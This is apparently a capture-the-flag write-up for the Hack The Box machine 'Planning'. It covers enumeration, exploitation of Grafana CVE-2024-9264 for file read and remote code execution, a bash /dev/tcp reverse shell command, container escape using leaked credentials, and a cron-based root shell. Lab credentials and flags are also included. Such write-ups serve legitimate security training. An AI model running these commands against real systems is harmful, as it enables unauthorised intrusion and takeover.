---
sticker: emoji//1f43c
---

# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |



# RECONNAISSANCE
---

As common in real life pentesting, we are provided with credentials:

```
admin:0D5oT70Fq13EvB5r
```


Let's check out the web application, first, we need to add `planning.htb` to `/etc/hosts`:

```
echo '10.10.11.68 planning.htb' | sudo tee -a /etc/hosts
```


![[Pasted image 20250601143242.png]]

At first sight, we can see this, source code seems normal, we can try fuzzing to check anything unusual on here:

```
gobuster dir -u http://planning.htb/ -w /usr/share/dirb/wordlists/common.txt -x php,txt,html -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://planning.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about.php            (Status: 200) [Size: 12727]
/contact.php          (Status: 200) [Size: 10632]
/course.php           (Status: 200) [Size: 10229]
/css                  (Status: 301) [Size: 178] [--> http://planning.htb/css/]
/detail.php           (Status: 200) [Size: 13006]
/img                  (Status: 301) [Size: 178] [--> http://planning.htb/img/]
/index.php            (Status: 200) [Size: 23914]
/index.php            (Status: 200) [Size: 23914]
/js                   (Status: 301) [Size: 178] [--> http://planning.htb/js/]
/lib                  (Status: 301) [Size: 178] [--> http://planning.htb/lib/]
```


After checking each of them, nothing valuable can be found, tried XSS, SQLI and LFI, nothing, let's try to fuzz for VHOSTS then:

```
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.68 -H "Host: FUZZ.planning.htb" -mc 200,301,302 -fs 178 -t 100 -ic -c

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.68
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 102ms]
```


We got one:

```
grafana.planning.htb
```

Let's add it and check it:


![[Pasted image 20250601144846.png]]

It contains a login page, let's login using our credentials:


```
admin:0D5oT70Fq13EvB5r
```

![[Pasted image 20250601145023.png]]

We are inside of Grafana, Grafana is an **open-source analytics and monitoring platform** used to visualize and analyze metrics from various data sources (like databases, cloud services, or time-series databases such as Prometheus). It enables users to create **interactive dashboards** with real-time charts, graphs, and alerts, making complex data accessible and actionable.

Knowing all this, we can begin exploitation.



# EXPLOITATION
---

First of all, let's check the version of the Grafana panel we are in, we can do this by clicking the `(?)` button on top right of the screen:


![[Pasted image 20250601145933.png]]

As seen, we are dealing with `Grafana V.11.0.0`, let's check an exploit for this version:


![[Pasted image 20250601150010.png]]

We find `CVE-2024-9264`, let's check it out:


Link: https://github.com/nollium/CVE-2024-9264


![[Pasted image 20250601150053.png]]
![[Pasted image 20250601150331.png]]


Ok, so based on this, we can perform arbitrary file read and luckily for us, even RCE, let's test the script:

```
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /etc/passwd
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/etc/passwd'):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```


![[Pasted image 20250601150134.png]]

It works perfectly, we can see the `/etc/passwd` file, based on that, let's try to achieve RCE, we can do:

```
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "id" http://grafana.planning.htb
```

![[Pasted image 20250601150417.png]]

As seen, RCE works perfectly, let's get ourselves a shell, set up a listener and do:

```python
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "bash -c "exec 5<>/dev/tcp/IP/4444; /bin/bash -i <&5 >&5 2>&5\" |" http://grafana.planning.htb
```


If we got our listener ready, we will receive the connection:

![[Pasted image 20250601151847.png]]


Let's begin privilege escalation.



# PRIVILEGE ESCALATION
---


First step is stabilizing our shell, let's do:

```
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![[Pasted image 20250601151943.png]]

We are inside of a docker container as the root user, we need a way to escape from it, let's use linpeas to check any way to get out of here:

![[Pasted image 20250601152428.png]]

If we take a closer look at the environment variables, we can see credentials:

```
enzo:RioTecRANDEntANT!
```

Let's go into ssh:


![[Pasted image 20250601152513.png]]

Well, we were able to escape the docker container, let's use linpeas again:

![[Pasted image 20250601153316.png]]

![[Pasted image 20250601153429.png]]

We got two interesting stuff, first, port `8000` is open inside of the machine, we can use ssh tunneling to access to it, then, we got a `crontab.db` file inside of `/opt/crontab`, let's get the db and take a look at it:

```json
cat crontab.db | jq
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}
```


As seen, we get a password, let's do ssh tunneling and check if there's any login page:

```
ssh -L 9000:127.0.0.1:8000 enzo@planning.htb
```

![[Pasted image 20250601153920.png]]

As expected, we need to use the credentials:

```
root:P4ssw0rdS0pRi0T3c
```

![[Pasted image 20250601154055.png]]

There we go, now, in order to get a root shell, we need to analyze the behavior of this, for example, we can check that we can create and run commands, so we can simply create a reverse shell command and run it:


![[Pasted image 20250601154221.png]]

![[Pasted image 20250601154259.png]]

Save the entry, set the listener and run it:

![[Pasted image 20250601154329.png]]

There we go, we got our shell as root, let's read both flags and end the CTF:

```
root@planning:/# cat /home/enzo/user.txt
b888e4ab837774053dde20317b16a977

root@planning:/# cat /root/root.txt
064d746b9baf3f4074796e2d4d8ea150
```

![[Pasted image 20250601154429.png]]


https://www.hackthebox.com/achievement/machine/1872557/660

